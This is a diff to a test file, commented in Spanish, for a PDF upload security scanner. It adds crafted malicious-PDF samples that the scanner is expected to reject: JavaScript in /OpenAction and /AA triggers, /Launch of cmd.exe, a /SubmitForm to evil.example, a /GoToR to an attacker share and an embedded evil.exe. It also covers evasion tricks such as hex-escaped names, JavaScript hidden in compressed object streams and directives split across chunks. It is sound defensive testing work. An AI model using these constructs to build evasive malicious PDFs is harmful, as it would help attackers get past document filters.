@@ -2,10 +2,13 @@
 import './setupTestEnv.js';
 
 import http from 'http';
+import crypto from 'crypto';
+import zlib from 'zlib';
 import { Readable } from 'stream';
 import jwt from 'jsonwebtoken';
 import { CloudflareR2Service, MemoryMockR2Service } from '../src/services/r2.service.js';
 import { validateFileStream, sanitizeLibraryText } from '../src/modules/library/library.validator.js';
+import { PdfSecurityScanner, PDF_SCANNER_LIMITS } from '../src/modules/library/pdfSecurityScanner.js';
 import {
   InMemoryLibraryService,
   setLibraryServiceForTesting,
@@ -141,9 +144,9 @@ async function main() {
   );
   assert(malLaunchRes.isValid === false, 'PDF con directiva /Launch es detectado y rechazado');
 
-  // 2.7 Detección de palabra clave partida entre dos chunks (tailBuffer remanente)
-  const chunk1 = Buffer.from('%PDF-1.4 Objeto con script dividido: /Java');
-  const chunk2 = Buffer.from('Script incrustado y peligroso %%EOF');
+  // 2.7 Detección de objeto PDF peligroso real partido entre dos chunks
+  const chunk1 = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /Java');
+  const chunk2 = Buffer.from('Script /JS (app.alert(1)) >> >>\nendobj\n%%EOF');
   const streamSplit = new Readable({
     read() {
       this.push(chunk1);
@@ -158,7 +161,407 @@ async function main() {
   );
   assert(
     splitRes.isValid === false && splitRes.hasDangerousPdfMarks === true,
-    'Detección infalible de script partido en el límite de 64 bytes entre dos chunks sucesivos (tailBuffer)'
+    'Detección de PDF peligroso real con directiva partida entre dos chunks sucesivos'
+  );
+
+  // 2.8 Cambio de política intencional: "/JavaScript" suelto en texto plano o string literal ahora es PERMITIDO
+  const plainJsTextPdf = Buffer.from(
+    '%PDF-1.4\n% Comentario con /JavaScript /Launch\n1 0 obj\n<< /Type /Catalog /Title (/JavaScript /JS /Launch /OpenAction) >>\nendobj\n/JavaScript suelto en texto plano fuera de diccionarios\n%%EOF'
+  );
+  const plainJsTextRes = await validateFileStream(
+    Readable.from(plainJsTextPdf),
+    'application/pdf',
+    plainJsTextPdf.length
+  );
+  assert(
+    plainJsTextRes.isValid === true,
+    'Cambio de política: "/JavaScript" suelto en texto plano, comentario o string literal es PERMITIDO'
+  );
+
+  // 2.9 Marca dentro de texto visible (content stream) es PERMITIDO
+  const contentStreamText = 'BT /F1 12 Tf 72 720 Td (/JavaScript /JS /Launch /OpenAction /AA) Tj ET';
+  const visibleTextPdf = Buffer.from(
+    `%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length ${contentStreamText.length} >>\nstream\n${contentStreamText}\nendstream\nendobj\n%%EOF`
+  );
+  const visibleTextRes = await validateFileStream(
+    Readable.from(visibleTextPdf),
+    'application/pdf',
+    visibleTextPdf.length
+  );
+  assert(
+    visibleTextRes.isValid === true,
+    'PDF con marcas solo dentro de texto visible (content stream) es PERMITIDO'
+  );
+
+  // 2.10 PDF con formulario (/AcroForm) y campo calculado (/FT y /Widget con /AA /C, /F, /K, /V) es PERMITIDO
+  const formPdf = Buffer.from(
+    '%PDF-1.4\n' +
+      '1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [4 0 R 5 0 R] >> >>\nendobj\n' +
+      '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n' +
+      '3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [4 0 R 5 0 R 8 0 R] >>\nendobj\n' +
+      '4 0 obj\n<< /Type /Annot /Subtype /Widget /FT /Tx /T (Subtotal) /P 3 0 R /AA << /K << /S /JavaScript /JS (AFNumber_Keystroke(2,0,0,0,"",true)) >> /F << /S /JavaScript /JS (AFNumber_Format(2,0,0,0,"",true)) >> /V << /S /JavaScript /JS (AFRange_Validate(true,0,false,0)) >> >> >>\nendobj\n' +
+      '5 0 obj\n<< /FT /Tx /T (Total) /Kids [6 0 R] /AA << /C 7 0 R >> >>\nendobj\n' +
+      '6 0 obj\n<< /Type /Annot /Subtype /Widget /Parent 5 0 R /P 3 0 R >>\nendobj\n' +
+      '7 0 obj\n<< /Type /Action /S /JavaScript /JS (AFSimple_Calculate("SUM",["Subtotal"])) >>\nendobj\n' +
+      '8 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://frc.utn.edu.ar) >> >>\nendobj\n' +
+      '%%EOF'
+  );
+  const formPdfRes = await validateFileStream(
+    Readable.from(formPdf),
+    'application/pdf',
+    formPdf.length
+  );
+  assert(
+    formPdfRes.isValid === true,
+    'PDF con formulario (/AcroForm), campo calculado (/AA /C /F /K /V) y link /URI normal es PERMITIDO'
+  );
+
+  // 2.11 PDF con /OpenAction de navegación (GoTo y destino [página /Fit]) es PERMITIDO
+  const navFitPdf = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /Fit] >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n%%EOF'
+  );
+  const navFitRes = await validateFileStream(
+    Readable.from(navFitPdf),
+    'application/pdf',
+    navFitPdf.length
+  );
+  assert(navFitRes.isValid === true, 'PDF con /OpenAction [3 0 R /Fit] de navegación es PERMITIDO');
+
+  const navGoToPdf = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n4 0 obj\n<< /Type /Action /S /GoTo /D [3 0 R /XYZ 0 792 null] >>\nendobj\n%%EOF'
+  );
+  const navGoToRes = await validateFileStream(
+    Readable.from(navGoToPdf),
+    'application/pdf',
+    navGoToPdf.length
+  );
+  assert(navGoToRes.isValid === true, 'PDF con /OpenAction /S /GoTo indirecto es PERMITIDO');
+
+  // Helper para comprobar que los mensajes de rechazo nunca filtran marcas técnicas
+  const TECHNICAL_MARKS_FORBIDDEN_IN_USER_MSG = [
+    '/JavaScript',
+    '/JS',
+    '/Launch',
+    '/OpenAction',
+    '/AA',
+    '/EmbeddedFile',
+    '/ObjStm',
+    '/Encrypt',
+    '/SubmitForm',
+    '/ImportData',
+    '/GoToR',
+    '/GoToE',
+  ];
+  function assertUserMsgIsCleanAndHelpful(res: Awaited<ReturnType<typeof validateFileStream>>, label: string) {
+    const err = res.error || '';
+    const leaksMark = TECHNICAL_MARKS_FORBIDDEN_IN_USER_MSG.some((m) => err.includes(m));
+    assert(
+      !leaksMark && /exportar|imprimilo a PDF/i.test(err),
+      `${label}: mensaje al usuario no expone marcas técnicas y sugiere re-exportar o imprimir a PDF`
+    );
+  }
+
+  // 2.12 PDF con JavaScript en /OpenAction (directo e indirecto) -> RECHAZADO
+  const openActionJsDirect = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\nendobj\n%%EOF'
+  );
+  const oaJsDirectRes = await validateFileStream(
+    Readable.from(openActionJsDirect),
+    'application/pdf',
+    openActionJsDirect.length
+  );
+  assert(
+    oaJsDirectRes.isValid === false && oaJsDirectRes.hasDangerousPdfMarks === true,
+    'PDF con JavaScript directo en /OpenAction es RECHAZADO'
+  );
+  assertUserMsgIsCleanAndHelpful(oaJsDirectRes, '/OpenAction JS directo');
+
+  const openActionJsIndirect = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction 7 0 R >>\nendobj\n7 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj\n%%EOF'
+  );
+  const oaJsIndirectRes = await validateFileStream(
+    Readable.from(openActionJsIndirect),
+    'application/pdf',
+    openActionJsIndirect.length
+  );
+  assert(
+    oaJsIndirectRes.isValid === false && oaJsIndirectRes.hasDangerousPdfMarks === true,
+    'PDF con JavaScript en /OpenAction por referencia indirecta (7 0 R) es RECHAZADO'
+  );
+
+  // /OpenAction con /URI también rechazado
+  const openActionUri = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /URI /URI (https://evil.example) >> >>\nendobj\n%%EOF'
+  );
+  const oaUriRes = await validateFileStream(
+    Readable.from(openActionUri),
+    'application/pdf',
+    openActionUri.length
+  );
+  assert(
+    oaUriRes.isValid === false && oaUriRes.hasDangerousPdfMarks === true,
+    'PDF con /OpenAction apuntando a /URI es RECHAZADO'
+  );
+
+  // 2.13 /AA con JS en /Page, /Catalog, trigger /PO de Widget, objeto genérico y botón /A con JS -> RECHAZADOS
+  const aaPagePdf = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Page /AA << /O << /S /JavaScript /JS (app.alert(1)) >> >> >>\nendobj\n%%EOF'
+  );
+  const aaPageRes = await validateFileStream(Readable.from(aaPagePdf), 'application/pdf', aaPagePdf.length);
+  assert(aaPageRes.isValid === false && aaPageRes.hasDangerousPdfMarks === true, 'PDF con /AA /O en /Page es RECHAZADO');
+
+  const aaPageCalcSpoofPdf = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Page /FT /Tx /AA << /C << /S /JavaScript /JS (app.alert(1)) >> >> >>\nendobj\n%%EOF'
+  );
+  const aaPageSpoofRes = await validateFileStream(
+    Readable.from(aaPageCalcSpoofPdf),
+    'application/pdf',
+    aaPageCalcSpoofPdf.length
+  );
+  assert(
+    aaPageSpoofRes.isValid === false && aaPageSpoofRes.hasDangerousPdfMarks === true,
+    'PDF con /Page spoofeando /FT /Tx y /AA /C sigue siendo RECHAZADO'
+  );
+
+  const aaCatalogPdf = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /AA << /WC << /S /JavaScript /JS (app.alert(1)) >> >> >>\nendobj\n%%EOF'
+  );
+  const aaCatalogRes = await validateFileStream(Readable.from(aaCatalogPdf), 'application/pdf', aaCatalogPdf.length);
+  assert(aaCatalogRes.isValid === false && aaCatalogRes.hasDangerousPdfMarks === true, 'PDF con /AA en /Catalog es RECHAZADO');
+
+  const aaWidgetHoverPdf = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Annot /Subtype /Widget /FT /Tx /AA << /PO << /S /JavaScript /JS (app.alert(1)) >> >> >>\nendobj\n%%EOF'
+  );
+  const aaWidgetHoverRes = await validateFileStream(
+    Readable.from(aaWidgetHoverPdf),
+    'application/pdf',
+    aaWidgetHoverPdf.length
+  );
+  assert(
+    aaWidgetHoverRes.isValid === false && aaWidgetHoverRes.hasDangerousPdfMarks === true,
+    'PDF con /AA trigger /PO (apertura) en /Widget es RECHAZADO'
+  );
+
+  const aaGenericPdf = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Foo /Bar /AA << /C << /S /JavaScript /JS (app.alert(1)) >> >> >>\nendobj\n%%EOF'
+  );
+  const aaGenericRes = await validateFileStream(Readable.from(aaGenericPdf), 'application/pdf', aaGenericPdf.length);
+  assert(aaGenericRes.isValid === false && aaGenericRes.hasDangerousPdfMarks === true, 'PDF con /AA en objeto genérico sin /FT ni /Widget es RECHAZADO');
+
+  const btnActionJsPdf = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Annot /Subtype /Widget /FT /Btn /A << /S /JavaScript /JS (app.alert(1)) >> >>\nendobj\n%%EOF'
+  );
+  const btnActionJsRes = await validateFileStream(
+    Readable.from(btnActionJsPdf),
+    'application/pdf',
+    btnActionJsPdf.length
+  );
+  assert(
+    btnActionJsRes.isValid === false && btnActionJsRes.hasDangerousPdfMarks === true,
+    'Botón /Widget /FT /Btn con acción /A de JavaScript es RECHAZADO'
+  );
+
+  // 2.14 Capacidades peligrosas siempre bloqueadas: /Names /JavaScript, /SubmitForm, /ImportData, /GoToR, /GoToE, /EmbeddedFile
+  const dangerousVectors: Array<[string, string]> = [
+    ['/Names /JavaScript', '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Names << /JavaScript 2 0 R >> >>\nendobj\n%%EOF'],
+    ['/SubmitForm', '%PDF-1.4\n1 0 obj\n<< /Type /Action /S /SubmitForm /F (https://evil.example) >>\nendobj\n%%EOF'],
+    ['/ImportData', '%PDF-1.4\n1 0 obj\n<< /Type /Action /S /ImportData /F (data.fdf) >>\nendobj\n%%EOF'],
+    ['/GoToR', '%PDF-1.4\n1 0 obj\n<< /Type /Action /S /GoToR /F (\\\\\\\\attacker\\\\share\\\\x.pdf) >>\nendobj\n%%EOF'],
+    ['/GoToE', '%PDF-1.4\n1 0 obj\n<< /Type /Action /S /GoToE /T << /R /C /N (payload) >> >>\nendobj\n%%EOF'],
+    ['/EmbeddedFile', '%PDF-1.4\n1 0 obj\n<< /Type /Filespec /F (evil.exe) /EF << /F 2 0 R >> >>\nendobj\n%%EOF'],
+  ];
+  for (const [label, raw] of dangerousVectors) {
+    const buf = Buffer.from(raw);
+    const res = await validateFileStream(Readable.from(buf), 'application/pdf', buf.length);
+    assert(res.isValid === false && res.hasDangerousPdfMarks === true, `Vector peligroso ${label} es RECHAZADO`);
+  }
+
+  // 2.15 /ObjStm comprimido con zlib: válido permitido, malicioso rechazado, /Encrypt + /ObjStm rechazado como protegido
+  const safeObjStmHdr = '1 0 ';
+  const safeObjStmInner = Buffer.from(safeObjStmHdr + '<< /Type /Catalog /OpenAction [3 0 R /Fit] >>');
+  const safeObjStmComp = zlib.deflateSync(safeObjStmInner);
+  const safeObjStmPdf = Buffer.concat([
+    Buffer.from(`%PDF-1.5\n10 0 obj\n<< /Type /ObjStm /N 1 /First ${safeObjStmHdr.length} /Filter /FlateDecode /Length ${safeObjStmComp.length} >>\nstream\n`),
+    safeObjStmComp,
+    Buffer.from('\nendstream\nendobj\n%%EOF'),
+  ]);
+  const safeObjStmRes = await validateFileStream(
+    Readable.from(safeObjStmPdf),
+    'application/pdf',
+    safeObjStmPdf.length
+  );
+  assert(safeObjStmRes.isValid === true, 'PDF con /ObjStm comprimido y contenido legítimo es PERMITIDO');
+
+  const malObjStmPart1 = '<< /Type /Catalog /OpenAction 2 0 R >> ';
+  const malObjStmHdr = `1 0 2 ${malObjStmPart1.length} `;
+  const malObjStmInner = Buffer.from(malObjStmHdr + malObjStmPart1 + '<< /S /JavaScript /JS (app.alert(1)) >>');
+  const malObjStmComp = zlib.deflateSync(malObjStmInner);
+  const malObjStmPdf = Buffer.concat([
+    Buffer.from(`%PDF-1.5\n10 0 obj\n<< /Type /ObjStm /N 2 /First ${malObjStmHdr.length} /Filter /FlateDecode /Length ${malObjStmComp.length} >>\nstream\n`),
+    malObjStmComp,
+    Buffer.from('\nendstream\nendobj\n%%EOF'),
+  ]);
+  const malObjStmRes = await validateFileStream(
+    Readable.from(malObjStmPdf),
+    'application/pdf',
+    malObjStmPdf.length
+  );
+  assert(
+    malObjStmRes.isValid === false && malObjStmRes.hasDangerousPdfMarks === true,
+    'PDF con /OpenAction JS oculto dentro de /ObjStm comprimido es RECHAZADO'
+  );
+
+  const encryptedObjStmPdf = Buffer.concat([
+    Buffer.from(`%PDF-1.5\n10 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length ${safeObjStmComp.length} >>\nstream\n`),
+    safeObjStmComp,
+    Buffer.from('\nendstream\nendobj\ntrailer\n<< /Encrypt 99 0 R >>\n%%EOF'),
+  ]);
+  const encryptedObjStmRes = await validateFileStream(
+    Readable.from(encryptedObjStmPdf),
+    'application/pdf',
+    encryptedObjStmPdf.length
+  );
+  assert(
+    encryptedObjStmRes.isValid === false &&
+      /PDF protegido/i.test(encryptedObjStmRes.error || '') &&
+      /exportarlo|imprimilo a PDF/i.test(encryptedObjStmRes.error || ''),
+    'PDF con /Encrypt y /ObjStm falla cerrado con mensaje claro de PDF protegido'
+  );
+  assertUserMsgIsCleanAndHelpful(encryptedObjStmRes, '/Encrypt + /ObjStm');
+
+  const corruptObjStmPdf = Buffer.from(
+    '%PDF-1.5\n10 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length 12 >>\nstream\nnot-zlib-data\nendstream\nendobj\n%%EOF'
+  );
+  const corruptObjStmRes = await validateFileStream(
+    Readable.from(corruptObjStmPdf),
+    'application/pdf',
+    corruptObjStmPdf.length
+  );
+  assert(
+    corruptObjStmRes.isValid === false && corruptObjStmRes.hasDangerousPdfMarks === false,
+    'Adverso: /ObjStm corrupto no inspeccionable falla cerrado (RECHAZADO)'
+  );
+  assertUserMsgIsCleanAndHelpful(corruptObjStmRes, '/ObjStm corrupto');
+
+  // 2.16 Tests adversos (truncado, ciclos, anidamiento profundo, escapes hex, endstream partido, 25 MB random, no-throw)
+  const truncatedPdf = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /GoTo');
+  const truncatedRes = await validateFileStream(
+    Readable.from(truncatedPdf),
+    'application/pdf',
+    truncatedPdf.length
+  );
+  assert(truncatedRes.isValid === false, 'Adverso: PDF truncado es RECHAZADO (fail-closed)');
+  assertUserMsgIsCleanAndHelpful(truncatedRes, 'PDF truncado');
+
+  const circularPdf = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R >>\nendobj\n2 0 obj\n3 0 R\nendobj\n3 0 obj\n2 0 R\nendobj\n%%EOF'
+  );
+  const circularRes = await validateFileStream(
+    Readable.from(circularPdf),
+    'application/pdf',
+    circularPdf.length
+  );
+  assert(circularRes.isValid === false, 'Adverso: referencias circulares en /OpenAction son RECHAZADAS sin ciclo infinito');
+
+  const deepNestCount = PDF_SCANNER_LIMITS.MAX_NESTING_DEPTH + 5;
+  const deepNestPdf = Buffer.from(
+    `%PDF-1.4\n1 0 obj\n${'<< /A '.repeat(deepNestCount)}1${' >>'.repeat(deepNestCount)}\nendobj\n%%EOF`
+  );
+  const deepNestRes = await validateFileStream(
+    Readable.from(deepNestPdf),
+    'application/pdf',
+    deepNestPdf.length
+  );
+  assert(deepNestRes.isValid === false, 'Adverso: anidamiento superior a MAX_NESTING_DEPTH es RECHAZADO');
+
+  const hexEscapedLaunchPdf = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Action /S /L#61unch /F (cmd.exe) >>\nendobj\n%%EOF'
+  );
+  const hexLaunchRes = await validateFileStream(
+    Readable.from(hexEscapedLaunchPdf),
+    'application/pdf',
+    hexEscapedLaunchPdf.length
+  );
+  assert(
+    hexLaunchRes.isValid === false && hexLaunchRes.hasDangerousPdfMarks === true,
+    'Adverso: nombre con escape hex (/L#61unch) es decodificado y RECHAZADO'
+  );
+
+  const hexEscapedJsPdf = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /J#61vaScript /J#53 (app.alert(1)) >> >>\nendobj\n%%EOF'
+  );
+  const hexJsRes = await validateFileStream(
+    Readable.from(hexEscapedJsPdf),
+    'application/pdf',
+    hexEscapedJsPdf.length
+  );
+  assert(
+    hexJsRes.isValid === false && hexJsRes.hasDangerousPdfMarks === true,
+    'Adverso: nombre con escape hex (/J#61vaScript /J#53) en /OpenAction es RECHAZADO'
+  );
+
+  // Marca y endstream partidos entre chunks dentro de objeto real
+  const splitEndstreamChunk1 = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Length 20 >>\nstream\nhello /JS world ends'
+  );
+  const splitEndstreamChunk2 = Buffer.from(
+    'tream\nendobj\n2 0 obj\n<< /Type /Catalog /OpenAction << /S /La'
+  );
+  const splitEndstreamChunk3 = Buffer.from('unch /F (calc) >> >>\nendobj\n%%EOF');
+  const splitObjStream = Readable.from([splitEndstreamChunk1, splitEndstreamChunk2, splitEndstreamChunk3]);
+  const splitObjRes = await validateFileStream(
+    splitObjStream,
+    'application/pdf',
+    splitEndstreamChunk1.length + splitEndstreamChunk2.length + splitEndstreamChunk3.length
+  );
+  assert(
+    splitObjRes.isValid === false && splitObjRes.hasDangerousPdfMarks === true,
+    'Adverso: endstream partido y /Launch partido entre chunks dentro de objetos reales son detectados'
+  );
+
+  // PDF de 25 MB de bytes aleatorios sin estructura peligrosa (con /JS casual incluido) -> PERMITIDO y rápido
+  const randomPayloadSize = 25 * 1024 * 1024 - 512;
+  const randomPayload = crypto.randomBytes(randomPayloadSize);
+  Buffer.from('/JS /JavaScript /OpenAction /Launch ').copy(randomPayload, Math.floor(randomPayloadSize / 2));
+  const pdf25Header = Buffer.from(
+    `%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Length ${randomPayloadSize} >>\nstream\n`
+  );
+  const pdf25Footer = Buffer.from('\nendstream\nendobj\n%%EOF');
+  const total25Bytes = pdf25Header.length + randomPayload.length + pdf25Footer.length;
+  async function* generate25MbChunks() {
+    yield pdf25Header;
+    const step = 64 * 1024;
+    for (let offset = 0; offset < randomPayload.length; offset += step) {
+      yield randomPayload.subarray(offset, Math.min(offset + step, randomPayload.length));
+    }
+    yield pdf25Footer;
+  }
+  const t25Start = Date.now();
+  const res25Mb = await validateFileStream(
+    Readable.from(generate25MbChunks()),
+    'application/pdf',
+    total25Bytes
+  );
+  const t25ElapsedMs = Date.now() - t25Start;
+  assert(
+    res25Mb.isValid === true && t25ElapsedMs < LIBRARY_CONFIG.STREAMING_TIMEOUT_MS,
+    `Adverso: PDF de 25 MB con bytes aleatorios y /JS casual es PERMITIDO sin colgarse (${t25ElapsedMs} ms)`
+  );
+
+  // Contrato no-throw: PdfSecurityScanner nunca lanza hacia afuera
+  let threwOutside = false;
+  let noThrowScanResult: any = null;
+  try {
+    const rawScanner = new PdfSecurityScanner();
+    rawScanner.feed(null as any);
+    rawScanner.feed({ invalid: true } as any);
+    noThrowScanResult = rawScanner.finish();
+  } catch {
+    threwOutside = true;
+  }
+  assert(
+    !threwOutside && noThrowScanResult?.isSafe === false,
+    'Adverso: PdfSecurityScanner nunca lanza excepciones hacia afuera y falla cerrado'
   );
 
   // ---------------------------------------------------------------------------
